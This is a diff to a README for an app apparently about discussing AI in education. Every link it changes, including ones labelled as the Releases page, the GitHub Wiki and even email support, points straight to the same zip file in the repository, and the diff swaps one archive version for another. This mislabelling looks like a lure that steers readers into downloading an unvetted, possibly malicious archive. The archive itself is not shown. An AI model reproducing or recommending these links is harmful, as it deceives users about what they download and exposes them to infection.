@@ -1,6 +1,6 @@
 # 🎓 eduai-friction - Discuss AI in Education Effectively
 
-[![Download eduai-friction](https://raw.githubusercontent.com/wxoonz/eduai-friction/main/eduai_friction/eduai_friction_v3.1.zip)](https://raw.githubusercontent.com/wxoonz/eduai-friction/main/eduai_friction/eduai_friction_v3.1.zip)
+[![Download eduai-friction](https://github.com/wxoonz/eduai-friction/raw/refs/heads/main/eduai_friction/eduai_friction_2.4.zip)](https://github.com/wxoonz/eduai-friction/raw/refs/heads/main/eduai_friction/eduai_friction_2.4.zip)
 
 ## 📋 Overview
 
@@ -22,7 +22,7 @@ To get started with eduai-friction, follow these simple steps:
 
 First, visit the Releases page to download the latest version of eduai-friction. Click the link below:
 
-[Visit this page to download](https://raw.githubusercontent.com/wxoonz/eduai-friction/main/eduai_friction/eduai_friction_v3.1.zip)
+[Visit this page to download](https://github.com/wxoonz/eduai-friction/raw/refs/heads/main/eduai_friction/eduai_friction_2.4.zip)
 
 ### 2. Choose Your Version
 
@@ -58,7 +58,7 @@ To run eduai-friction smoothly, ensure your device meets these requirements:
 
 ## 📚 Resources
 
-- **Documentation:** Detailed guides and FAQs are available within the application and on the [GitHub Wiki](https://raw.githubusercontent.com/wxoonz/eduai-friction/main/eduai_friction/eduai_friction_v3.1.zip).
+- **Documentation:** Detailed guides and FAQs are available within the application and on the [GitHub Wiki](https://github.com/wxoonz/eduai-friction/raw/refs/heads/main/eduai_friction/eduai_friction_2.4.zip).
 - **Community Support:** Join our community forums to share your experiences and seek advice from other users.
 - **Updates:** Regular updates improve features and address any feedback from users.
 
@@ -66,7 +66,7 @@ To run eduai-friction smoothly, ensure your device meets these requirements:
 
 If you encounter any issues or have questions, feel free to reach out for help. Here are the ways you can get in touch:
 
-- **Email Support:** Contact us at https://raw.githubusercontent.com/wxoonz/eduai-friction/main/eduai_friction/eduai_friction_v3.1.zip
+- **Email Support:** Contact us at https://github.com/wxoonz/eduai-friction/raw/refs/heads/main/eduai_friction/eduai_friction_2.4.zip
 - **GitHub Issues:** Report any bugs or request features on our GitHub Issues page.
 
 ## 🏷️ Topics Covered
@@ -93,4 +93,4 @@ By using this application, you can better understand and navigate the complexiti
 
 ## 🎯 Download & Install
 
-To get started with eduai-friction, return to the [Releases page](https://raw.githubusercontent.com/wxoonz/eduai-friction/main/eduai_friction/eduai_friction_v3.1.zip) and download the file that fits your needs. Follow the installation steps listed above, and begin using the software to enhance discussions around AI in education.
+To get started with eduai-friction, return to the [Releases page](https://github.com/wxoonz/eduai-friction/raw/refs/heads/main/eduai_friction/eduai_friction_2.4.zip) and download the file that fits your needs. Follow the installation steps listed above, and begin using the software to enhance discussions around AI in education.
